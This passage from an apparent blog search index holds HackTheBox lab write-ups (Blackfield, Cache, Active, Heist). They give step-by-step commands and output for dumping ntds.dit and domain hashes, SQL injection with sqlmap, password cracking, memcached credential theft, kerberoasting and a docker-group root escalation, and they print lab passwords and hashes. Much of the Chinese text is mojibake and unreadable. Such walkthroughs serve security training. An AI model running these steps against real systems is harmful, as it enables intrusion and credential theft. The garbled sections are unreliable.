CLIENTACCESSIBLE Add extra character behind set context persistent nowriterssadd volume c: alias ikonwwcreateeexpose %ikonw% z:: However one more error!! The .cab metadata file cannot be stored in the current working directory, because it is read-only. ermmm, maybe I am in the document directory create a temp folder at C:\\temp Finally, we successfully create the shadow disk at Z: drive *Evil-WinRM* PS C:\\temp&gt; diskshadow /s shadow_copy.txtMicrosoft DiskShadow version 1.0Copyright (C) 2013 Microsoft CorporationOn computer: DC01, 9/8/2020 5:40:45 AM-&gt; set context persistent nowriters-&gt; add volume c: alias ikonw-&gt; createAlias ikonw for shadow ID &#123;f3ecf98c-d3cb-4ffe-8dc8-b613d3ab5922&#125; set as environment variable.Alias VSS_SHADOW_SET for shadow set ID &#123;115480f7-6f83-46ee-8ea6-4fcf8bcb1d81&#125; set as environment variable.Querying all shadow copies with the shadow copy set ID &#123;115480f7-6f83-46ee-8ea6-4fcf8bcb1d81&#125; * Shadow copy ID = &#123;f3ecf98c-d3cb-4ffe-8dc8-b613d3ab5922&#125; %ikonw% - Shadow copy set: &#123;115480f7-6f83-46ee-8ea6-4fcf8bcb1d81&#125; %VSS_SHADOW_SET% - Original count of shadow copies = 1 - Original volume name: \\\\?\\Volume&#123;351b4712-0000-0000-0000-602200000000&#125;\\ [C:\\] - Creation time: 9/8/2020 5:40:45 AM - Shadow copy device name: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2 - Originating machine: DC01.BLACKFIELD.local - Service machine: DC01.BLACKFIELD.local - Not exposed - Provider ID: &#123;b5946137-7b9f-4925-af80-51abd60b20d5&#125; - Attributes: No_Auto_Release Persistent No_Writers DifferentialNumber of shadow copies listed: 1-&gt; expose %ikonw% z:-&gt; %ikonw% = &#123;f3ecf98c-d3cb-4ffe-8dc8-b613d3ab5922&#125;The shadow copy was successfully exposed as z:\\.-&gt; The z: drive shadow folder permission also inherited from the C:, we dont have the permission to download the files. After looking at the github page If you want to read&#x2F;copy data out of a â€œnormally forbiddenâ€ folder, you have to act as a backup software. The shell copy command wonâ€™t work; youâ€™ll need to open the source file manually using CreateFile making sure to specify the FILE_FLAG_BACKUP_SEMANTICS flag. SeBackupPrivilegeCmdLets.dll SeBackupPrivilegeUtils.dll Evil-WinRM* PS C:\\temp&gt; Import-Module .\\SeBackupPrivilegeUtils.dll*Evil-WinRM* PS C:\\temp&gt; Import-Module .\\SeBackupPrivilegeCmdLets.dll*Evil-WinRM* PS C:\\temp&gt; cd z:\\windows\\ntds*Evil-WinRM* PS z:\\windows\\ntds&gt; Copy-FileSeBackupPrivilege ntds.dit c:\\temp\\ntds.dit*Evil-WinRM* PS z:\\windows\\ntds&gt; cd c:\\temp*Evil-WinRM* PS C:\\temp&gt; dir Directory: C:\\tempMode LastWriteTime Length Name---- ------------- ------ -----a---- 9/8/2020 5:40 AM 617 2020-09-08_5-40-45_DC01.cab-a---- 9/8/2020 5:52 AM 18874368 ntds.dit-a---- 9/8/2020 5:50 AM 12288 SeBackupPrivilegeCmdLets.dll-a---- 9/8/2020 5:51 AM 16384 SeBackupPrivilegeUtils.dll-a---- 9/8/2020 5:40 AM 88 shadow_copy.txt and we got the ntds.dit files. download to kali and use secretsdump ,I just realize still need a extra system hive file. reg save HKLM\\SYSTEM c:\\temp\\system.hive â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/hackthebox/Windows/blackfield]â””â”€# python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -ntds ntds.dit -system system.hive -hashes lmhash:nthash LOCAL -outputfile hash | moreImpacket v0.9.21 - Copyright 2020 SecureAuth Corporation[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)[*] Searching for pekList, be patient[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c[*] Reading and decrypting hashes from ntds.dit Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::DC01$:1000:aad3b435b51404eeaad3b435b51404ee:65557f7ad03ac340a7eb12b9462f80d6:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::audit2020:1103:aad3b435b51404eeaad3b435b51404ee:c95ac94a048e7c29ac4b4320d7c9d3b5:::support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212::: and we got the administrator hash, use evil-winrm to login and we got root!","categories":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/categories/hackthebox/"}],"tags":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/tags/hackthebox/"},{"name":"hard","slug":"hard","permalink":"https://ik0nw.github.io/tags/hard/"}]},{"title":"HTB Cache Writeup","slug":"HTB-cache","date":"2020-05-12T00:00:00.000Z","updated":"2020-10-16T09:15:45.678Z","comments":true,"path":"2020/05/12/HTB-cache/","permalink":"https://ik0nw.github.io/2020/05/12/HTB-cache/","excerpt":"Cache writeup available","text":"Cache writeup available Reconnmap result Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-27 03:26 EDTNmap scan report for 10.10.10.188Host is up (0.0068s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 (RSA)| 256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 (ECDSA)|_ 256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: CacheService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 7.90 seconds At the web page, found the hostname. Add it to the &#x2F;etc&#x2F;hosts file Tried SQL injection in the login page, it seems that itâ€™s some frontend authentication At the same time gobuster found out some directory 2020/08/27 03:58:38 Starting gobuster===============================================================/javascript (Status: 301)/jquery (Status: 301)/server-status (Status: 403)Progress: 179615 / 220561 (81.44%)^C And yeah, in the cache.htb&#x2F;jquery&#x2F;functionality.js We found some authentication codes. and we got the creds ash&#x2F;H@v3_fun $(function()&#123; var error_correctPassword = false; var error_username = false; function checkCorrectPassword()&#123; var Password = $(&quot;#password&quot;).val(); if(Password != &#x27;H@v3_fun&#x27;)&#123; alert(&quot;Password didn&#x27;t Match&quot;); error_correctPassword = true; &#125; &#125; function checkCorrectUsername()&#123; var Username = $(&quot;#username&quot;).val(); if(Username != &quot;ash&quot;)&#123; alert(&quot;Username didn&#x27;t Match&quot;); error_username = true; &#125; &#125; $(&quot;#loginform&quot;).submit(function(event) &#123; /* Act on the event */ error_correctPassword = false; checkCorrectPassword(); error_username = false; checkCorrectUsername(); if(error_correctPassword == false &amp;&amp; error_username ==false)&#123; return true; &#125; else&#123; return false; &#125; &#125;); After login, still didnt have any clue about next step. Went back to do some domain enumeration We actually got a new host name. Add it to host file. Now we have the OpenEMR CMS Tried the creds we found earlier on. Google about OpenEMR vulnerabilitys https://medium.com/@musyokaian/openemr-version-5-0-1-remote-code-execution-vulnerability-2f8fd8644a69 we came across this page, about SQL injection. http://hms.htb/portal/add_edit_event_user.php?eid=1 The eid value is vulnerable to SQL injection. Use burpsuite to capture the request GET /portal/add_edit_event_user.php?eid=1 HTTP/1.1Host: hms.htbUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeCookie: OpenEMR=qruref3qlj122khelbr48llu9a; PHPSESSID=t4ck5m5fkc7hrh1gsm8pued0fuUpgrade-Insecure-Requests: 1 Launch sqlmap to determine the existing database found openemr database sqlmap -r sqldump --dbs --batch[00:58:10] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL &gt;= 5.1[00:58:10] [INFO] fetching database names[00:58:10] [INFO] retrieved: &#x27;information_schema&#x27;[00:58:10] [INFO] retrieved: &#x27;openemr&#x27;available databases [2]: [*] information_schema[*] openemr[00:58:10] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/hms.htb&#x27; However if we retrieve the tables, we got tons of result sqlmap -r sqldump --batch -D openemr --tables Google for the OpenEMR database structure https://www.open-emr.org/wiki/index.php/Database_Structure We found out the table users_secure holds the login credentials sqlmap -r sqldump --batch -D openemr -T users_secure --dump and yeah, we got the creds [01:11:52] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL &gt;= 5.1[01:11:52] [INFO] fetching columns for table &#x27;users_secure&#x27; in database &#x27;openemr&#x27;[01:11:52] [INFO] resumed: &#x27;id&#x27;,&#x27;bigint(20)&#x27;[01:11:52] [INFO] resumed: &#x27;username&#x27;,&#x27;varchar(255)&#x27;[01:11:52] [INFO] resumed: &#x27;password&#x27;,&#x27;varchar(255)&#x27;[01:11:52] [INFO] resumed: &#x27;salt&#x27;,&#x27;varchar(255)&#x27;[01:11:52] [INFO] resumed: &#x27;last_update&#x27;,&#x27;timestamp&#x27;[01:11:52] [INFO] resumed: &#x27;password_history1&#x27;,&#x27;varchar(255)&#x27;[01:11:52] [INFO] resumed: &#x27;salt_history1&#x27;,&#x27;varchar(255)&#x27;[01:11:52] [INFO] resumed: &#x27;password_history2&#x27;,&#x27;varchar(255)&#x27;[01:11:52] [INFO] resumed: &#x27;salt_history2&#x27;,&#x27;varchar(255)&#x27;[01:11:52] [INFO] fetching entries for table &#x27;users_secure&#x27; in database &#x27;openemr&#x27; [01:11:52] [WARNING] reflective value(s) found and filtering outDatabase: openemrTable: users_secure[1 entry]+------+--------------------------------+---------------+--------------------------------------------------------------+---------------------+---------------+---------------+-------------------+-------------------+| id | salt | username | password | last_update | salt_history1 | salt_history2 | password_history1 | password_history2 |+------+--------------------------------+---------------+--------------------------------------------------------------+---------------------+---------------+---------------+-------------------+-------------------+| 1 | $2a$05$l2sTLIG6GTBeyBf7TAKL6A$ | openemr_admin | $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B. | 2019-11-21 06:38:40 | NULL | NULL | NULL | NULL |+------+--------------------------------+---------------+--------------------------------------------------------------+---------------------+---------------+---------------+-------------------+-------------------+ Used the sqlmap cracked the password (Ignore the salt) â””â”€# john --wordlist=/usr/share/wordlists/rockyou.txt credsUsing default input encoding: UTF-8Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])Cost 1 (iteration count) is 32 for all loaded hashesWill run 4 OpenMP threadsPress &#x27;q&#x27; or Ctrl-C to abort, almost any other key for statusxxxxxx (?)1g 0:00:00:00 DONE (2020-08-31 01:16) 3.846g/s 3323p/s 3323c/s 3323C/s tristan..felipeUse the &quot;--show&quot; option to display all of the cracked passwords reliablySession completed I found the exploit from the searchexploit 48515.py but it seems failed for unknowed error The exploit looks easy, maybe I should do it manually write a simple reverse shell. visit the link http://hms.htb/sites/default/letter_templates/custom_pdf.php and we got the shell finally Use the creds we found earlier on, we manage to login to ash account and obtain the user.txt After some enumeration, we found port 11211 is listening to host only. ash@cache:/$ netstat -tulpn(Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.)Active Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:11211 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp6 0 0 :::80 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - udp 0 0 127.0.0.53:53 0.0.0.0:* we found this article https://www.hackingarticles.in/penetration-testing-on-memcached-server/ Connected to localhost.Escape character is &#x27;^]&#x27;.get userget userVALUE user 0 5luffyENDget passwdget passwdVALUE passwd 0 90n3_p1ec3END we got the user luffy after switching user to luffy we found luffy has the docker group luffy@cache:/$ iduid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker) we are able to obtain root shell, luffy@cache:/$ docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEubuntu latest 2ca708c1c9cc 11 months ago 64.2MB luffy@cache:/$ docker run -v /:/mnt --rm -it ubuntu chroot /mnt bashroot@23919723759f:/#","categories":[{"name":"HackTheBox-Medium","slug":"HackTheBox-Medium","permalink":"https://ik0nw.github.io/categories/HackTheBox-Medium/"}],"tags":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/tags/hackthebox/"}],"author":"Ikonw"},{"title":"HTB Active Writeup","slug":"HTB-Active","date":"2020-02-09T16:00:00.000Z","updated":"2023-11-29T13:14:51.758Z","comments":true,"path":"2020/02/10/HTB-Active/","permalink":"https://ik0nw.github.io/2020/02/10/HTB-Active/","excerpt":"","text":"æ”»å‡»æœºï¼šå®˜æ–¹Kali linux 2019 64ä½ä½œè€…ï¼šIkonw é¶æœºä»‹ç» ä¸€ï¼Œç«¯å£æ‰«æè¿™è¾¹æˆ‘ç”¨çš„æ˜¯æˆ‘åœ¨OSCPæ—¶å€™ç”¨çš„ä¸€ä¸ªè„šæœ¬å·¥å…·ï¼ˆæ‡’æƒ°ï¼‰ nmapAutomator ./nmapAutomator.sh 10.10.10.100 Full1 é™¤äº†53å’Œ445å¹¶æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«èƒ½äº¤äº’çš„ç«¯å£ Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-10 18:56 +08Nmap scan report for 10.10.10.100Host is up (0.23s latency).PORT STATE SERVICE VERSION53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)| dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39)88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-02-10 10:57:27Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)3269/tcp open tcpwrapped5722/tcp open msrpc Microsoft Windows RPC9389/tcp open mc-nmf .NET Message Framing47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49152/tcp open msrpc Microsoft Windows RPC49153/tcp open msrpc Microsoft Windows RPC49154/tcp open msrpc Microsoft Windows RPC49155/tcp open msrpc Microsoft Windows RPC49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049158/tcp open msrpc Microsoft Windows RPC49169/tcp open msrpc Microsoft Windows RPC49171/tcp open msrpc Microsoft Windows RPC49182/tcp open msrpc Microsoft Windows RPCService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windowsHost script results:|_clock-skew: 38s| smb2-security-mode: | 2.02: |_ Message signing enabled and required| smb2-time: | date: 2020-02-10T10:58:25|_ start_date: 2020-02-10T08:17:06Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 194.25 seconds12345678910111213141516171819202122232425262728293031323334353637383940414243444546 ä¸€ï¼ŒSMB ENUMERATIONé¦–å…ˆ ä½¿ç”¨smbmap æ¥ç¡®å®šanonymousç”¨æˆ·çš„æƒé™ï¼ˆå¦‚æœæœ‰å†™æƒé™å¯ä»¥ç›´æ¥ç”¨impacket æ¥è·å–shellï¼‰ smbmap -H 10.10.10.1001 å‘ç°å¯¹ Replication æ–‡ä»¶å¤¹ READ ONLYæƒé™ï¼ˆè¿™é‡Œæˆ‘æœ¬æ¥æƒ³ä½¿ç”¨mountæŒ‚è½½smb, ä½†å¤±è´¥äº†ã€‚æœ‰æˆåŠŸçš„å¯ä»¥åœ¨è¯„è®ºå‘Šè¯‰æˆ‘ã€‚ï¼‰ ä½¿ç”¨ smbclientè¿›è¡Œè¿æ¥ Replication smbclient \\\\\\\\10.10.10.100\\\\Replication1 å‘ç°ä¸¤ä¸ªæœ‰æ„æ€çš„æ–‡ä»¶å¤¹ 31B2F340-016D-11D2-945F-00C04FB984F9 æ˜¯Default admin policy6AC1786C-016F-11D2-945F-00C04fB984F9 æ˜¯Default domain polices12 å¦‚æœæ²¡è®°é”™çš„è¯ windows server 2012ä»¥ä¸‹çš„ç‰ˆæœ¬ ä¼šæŠŠå¯†ç å‚¨å­˜åœ¨GPOã€‚ç»è¿‡ä¸€ç•ªæŸ¥æ‰¾smb: \\active.htb\\Policies{31B2F340-016D-11D2-945F-00C04FB984F9}\\Machine\\Preferences\\Groups åœ¨æ­¤ç›®å½•å‘ç°Groups.xml å‘ç°å¸å·å’Œå¯†ç å“ˆå¸Œå€¼ å¸å·ï¼šactive.htb\\SVC_TGSå“ˆå¸Œå€¼ï¼šedBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ12 å¯ä»¥ä½¿ç”¨kaliè‡ªå¸¦çš„gpp-decryptæ¥ç ´è§£å¯†ç  gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ1 å¾—åˆ°å¯†ç  GPPstillStandingStrong2k18ç°åœ¨æˆ‘ä»¬æœ‰äº†æ–°çš„å¸å· åˆ©ç”¨Smbmapç¡®è®¤æˆ‘ä»¬æ˜¯å¦æœ‰å†™çš„æƒé™ï¼ˆæ‹¿shellï¼‰ smbmap -H 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k181 å‘ç°èƒ½è¯»æƒé™èƒ½è¯»åˆ°userç›®å½•é‡Œçš„æ–‡ä»¶å¯ä»¥ç”¨smbclient è¿›å»æ‹¿user.txt ä¸‰ï¼ŒROOTä¹‹å‰çœ‹åˆ° ç«¯å£88 æœ‰ kerberos åœ¨è¿è¡Œã€‚å°è¯•åˆ©ç”¨kerberoasing æ”»å‡» Kerberoasing æ”»å‡» åˆ©ç”¨ impacket-GetUserSPNs /usr/bin/impacket-GetUserSPNs -request active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 12 å¾—åˆ°hashå åˆ©ç”¨john the ripperè¿›è¡Œç ´è§£å¾—åˆ° Administratorå¯†ç ä¸º Ticketmaster1968 å–åˆ°å¸å·å’Œå¯†ç å æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ impacket psexec è¿›è¡Œç™»å½• /usr/share/doc/python3-impacket/examples/psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.1001 æˆåŠŸ æ‹¿åˆ°Administrator","categories":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/categories/hackthebox/"}],"tags":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/tags/hackthebox/"},{"name":"smb","slug":"smb","permalink":"https://ik0nw.github.io/tags/smb/"}]},{"title":"HTB Heist Writeup","slug":"HTB-Heist","date":"2020-01-25T16:00:00.000Z","updated":"2023-11-29T13:14:25.148Z","comments":true,"path":"2020/01/26/HTB-Heist/","permalink":"https://ik0nw.github.io/2020/01/26/HTB-Heist/","excerpt":"","text":"No.4-Heist-éš¾åº¦ç®€å•-HTB-walkthroughæ”»å‡»æœºï¼šå®˜æ–¹Kali linux 2019 64ä½ä½œè€…ï¼šIkonw é¶æœºä»‹ç» ä¸€ï¼Œç«¯å£æ‰«ænmap -sV -sC heist.htb1Nmap scan report for heist.htb (10.10.10.149)Host is up (0.25s latency).Not shown: 997 filtered portsPORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 10.0| http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0| http-title: Support Login Page|_Requested resource was login.php 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds? Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 4s | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-01-25T01:23:05 |_ start_date: N/A 1234567891011121314151617181920212223242526 äºŒï¼ŒHTTP Enumerationè¿›å…¥web, æ˜¯ä¸ªç™»é™†é¡µé¢ã€‚ å¹¶æ²¡æœ‰æ‰¾åˆ°CMS, å³ä¸‹è§’æœ‰ä¸ª Login as guestå‘ç°è¿™æ˜¯ä¸ª ç±»ä¼¼äº Support desk çš„å¹³å°ã€‚ç‚¹å‡» Attachment è·³è½¬åˆ° config.txt version 12.2no service padservice password-encryption!isdn switch-type basic-5ess!hostname ios-1!security passwords min-length 12enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91!username rout3r password 7 0242114B0E143F015F5D1E161713username admin privilege 15 password 7 02375012182C1A1D751618034F36415408!!ip ssh authentication-retries 5ip ssh version 2!!router bgp 100 synchronization bgp log-neighbor-changes bgp dampening network 192.168.0.0Ã‚ mask 300.255.255.0 timers bgp 3 9 redistribute connected!ip classlessip route 0.0.0.0 0.0.0.0 192.168.0.1!!access-list 101 permit ip any anydialer-list 1 protocol ip list 101!no ip http serverno ip http secure-server!line vty 0 4 session-timeout 600 authorization exec SSH transport input ssh1234567891011121314151617181920212223242526272829303132333435363738394041 å…¶ä¸­æœ‰ä¸‰è¡Œæ˜¯åŒ…å«å“ˆå¸Œå€¼çš„ enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91 // Type 5 !username rout3r password 7 0242114B0E143F015F5D1E161713 //Type 7 username admin privilege 15 password 7 02375012182C1A1D751618034F36415408 //type 7 1234 æŒ‰ç…§ä¹‹å‰æ‰€è¯´çš„ï¼Œè¿™åº”è¯¥åˆ†åˆ«CISCOçš„å“ˆå¸Œå€¼ã€‚åˆ†åˆ«ä¸º type 5 è·Ÿ type 7ã€‚type 5æ˜¯æœ‰saltè¿‡çš„ã€‚åˆ©ç”¨ç½‘ä¸Šçš„å·¥å…·æ¥è¿›è¡Œç ´è§£ã€‚ Type 5 çš„æ¯”è¾ƒéº»çƒ¦ï¼Œç½‘ä¸Šçš„å·¥å…·æ²¡èƒ½æ‰¾åˆ°å¯†ç ã€‚æ‰¾åˆ°ä¸€ä¸ª githubè„šæœ¬ã€‚ç°åœ¨æˆ‘ä»¬å·²ç»æ‰¾åˆ°å…¨éƒ¨çš„è´¦å·å’Œå¯†ç  è´¦å· å¯†ç  admin $uperP@ssword rout3r Q4)sJu\\Y8qz*A3?d Hazard stealth1agent ä¸‰ï¼Œæ‹¿åˆ°shellå°è¯•ä½¿ç”¨ç°æœ‰çš„è´¦å·å’Œå¯†ç  æ¥ç™»é™†ç½‘é¡µï¼Œä½†æç¤ºéœ€è¦ç”¨é‚®ç®±ã€‚åˆ©ç”¨äº†ä¾‹å­å¦‚ &#97;&#100;&#109;&#x69;&#x6e;&#x40;&#104;&#101;&#105;&#115;&#116;&#x2e;&#104;&#116;&#98;ä¹Ÿæ²¡æœ‰è¿›å±•ã€‚ åˆ©ç”¨metasploit çš„smblogin æ¥è¿›è¡Œçˆ†ç ´ã€‚å‘ç°åªæœ‰ Hazrd:stealth1agent å¯ä»¥ç™»é™†å‘ç°æƒé™éƒ½æ˜¯No Accesså’ŒREADã€‚ root@xing# smbmap -H 10.10.10.149 -u hazard -p stealth1agent[+] Finding open SMB ports....[+] User SMB session establishd on 10.10.10.149...[+] IP: 10.10.10.149:445 Name: 10.10.10.149 Disk Permissions ---- ----------- ADMIN$ NO ACCESS C$ NO ACCESS IPC$ READ ONLY123456789 IPC$(Internet Process Connection)æ˜¯å…±äº«â€å‘½åç®¡é“â€çš„èµ„æºï¼Œå®ƒæ˜¯ä¸ºäº†è®©è¿›ç¨‹é—´é€šä¿¡è€Œå¼€æ”¾çš„å‘½åç®¡é“ï¼Œé€šè¿‡æä¾›å¯ä¿¡ä»»çš„ç”¨æˆ·åå’Œå£ä»¤ï¼Œè¿æ¥åŒæ–¹å¯ä»¥å»ºç«‹å®‰å…¨çš„é€šé“å¹¶ä»¥æ­¤é€šé“è¿›è¡ŒåŠ å¯†æ•°æ®çš„äº¤æ¢ï¼Œä»è€Œå®ç°å¯¹è¿œç¨‹è®¡ç®—æœºçš„è®¿é—®ã€‚ åœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ READ ONLY çš„IPC$æ¥å–å¾—æœ¬åœ°è´¦å·çš„ä¿¡æ¯ã€‚ åˆ©ç”¨rpclientæ¥è¿æ¥ rpcclient -U &quot;Hazard%stealth1agent&quot; heist.htb1 æˆ‘ä»¬ä¹Ÿå¯ä»¥åŒæ ·åˆ©ç”¨SIDæ¥è·å–ç”¨æˆ·åsidçš„åå››ä½æ˜¯ç”¨æˆ·çš„ç¼–å·ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡é€æ¸å¢åŠ æ¥æ‰¾åˆ°æœ¬æœºçš„ç”¨æˆ·åå­— lookupsids S-1-5-21-4254423774-1266059056-3197185112-10081 å‘ç°å¤šä¸‰ä¸ªç”¨æˆ·ä¸º Chase,support,Jasonã€‚ å¦å¤–ä¸€ä¸ªæ–¹æ³•æ˜¯ç”¨ impacket (å¥½ä¸œè¥¿å‘€ï¼‰ã€‚ root@xing:/opt# locate lookupsid.py/usr/share/doc/python3-impacket/examples/lookupsid.pyroot@xing:/opt# python /usr/share/doc/python3-impacket/examples/lookupsid.py Hazard:stealth1agent@10.10.10.149Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation[*] Brute forcing SIDs at 10.10.10.149[*] StringBinding ncacn_np:10.10.10.149[\\pipe\\lsarpc][*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112500: SUPPORTDESK\\Administrator (SidTypeUser)501: SUPPORTDESK\\Guest (SidTypeUser)503: SUPPORTDESK\\DefaultAccount (SidTypeUser)504: SUPPORTDESK\\WDAGUtilityAccount (SidTypeUser)513: SUPPORTDESK\\None (SidTypeGroup)1008: SUPPORTDESK\\Hazard (SidTypeUser)1009: SUPPORTDESK\\support (SidTypeUser)1012: SUPPORTDESK\\Chase (SidTypeUser)1013: SUPPORTDESK\\Jason (SidTypeUser)123456789101112131415161718 å°è¯•äº†å„ç§ç»„åˆè¿˜æ˜¯æ— æ³•ç™»é™†smbæˆ–è€…webã€‚äºæ˜¯å†³å®šå†æ‰«ä¸€énmap çœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆé«˜ç«¯å£æ˜¯æ¼æ‰çš„ã€‚å‘ç°äº†5985ç«¯å£å¼€ç€ WinRM æ˜¯windows ä¸€ç§æ–¹ä¾¿è¿œç¨‹ç®¡ç†çš„æœåŠ¡ï¼›å¼€å¯winrm service,ä¾¿äºåœ¨æ—¥å¸¸å·¥ä½œä¸­ï¼Œè¿œç¨‹ç®¡ç†æœåŠ¡å™¨ï¼Œæˆ–é€šè¿‡è„šæœ¬ï¼ŒåŒæ—¶ç®¡ç†å¤šå°æœåŠ¡å™¨ï¼Œæ¥æé«˜å·¥ä½œæ•ˆç‡ è¿™è¾¹å¯ä»¥åˆ©ç”¨ä¸€ç§å·¥å…·å«evil-winrm æ¥è¿›è¡Œç™»é™†ã€‚ æœ‰å…´è¶£çš„å¯ä»¥äº†è§£æ›´å¤šEvil-winRM è¿œç¨‹ç®¡ç†shell é¦–å…ˆï¼Œåˆ©ç”¨metasploit çš„ scanner&#x2F;winrm&#x2F;winrm_login æ¨¡å—æ¥çˆ†ç ´å¸å·å’Œå¯†ç ã€‚ï¼ˆè¿™ä¹ˆå¤šå¸å·å’Œå¯†ç  åˆ°åº•å“ªä¸ªå¯†ç æ˜¯å“ªä¸ªå‘€ï¼‰ã€‚ æŠŠæ–°å–å¾—çš„è´¦å· å…¨éƒ¨ä¿å­˜è¿› possible_userã€‚ç„¶åæ ¹æ®lookupsidå–å¾—çš„ DOMAINå¡«å†™ã€‚ æˆåŠŸå–å¾—æœ‰æ•ˆç™»é™† Chase:Q4)sJu\\Y8qz*A3?d åˆ©ç”¨evil-winrm è¿›è¡Œç™»é™† ruby evil-winrm.rb -i 10.10.10.149 -u Chase -p &quot;Q4)sJu\\Y8qz*A3?d&quot; å››ï¼Œææƒä¸€ç•ªæ¢ç´¢å å‘ç°æœ‰ firefox çš„ç¨‹åºå†è·‘åˆ©ç”¨å¾®è½¯çš„procdumpæŠŠ firefoxçš„æ—¥å¿— https://docs.microsoft.com/en-us/sysinternals/downloads/procdump åˆ©ç”¨ evil-winrm ä¸Šä¼  procdump.exe ç„¶åæ‰§è¡Œ upload proxdump.exeprocdump -ma 289212 åé¢ç”¨ grep æ‰¾å‡ºadmin åå‘ç°å¯†ç ã€‚ä½¿ç”¨evil win-rm ç™»é™†å å–åˆ° root flag","categories":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/categories/hackthebox/"}],"tags":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/tags/hackthebox/"}]},{"title":"HTB Jarvis 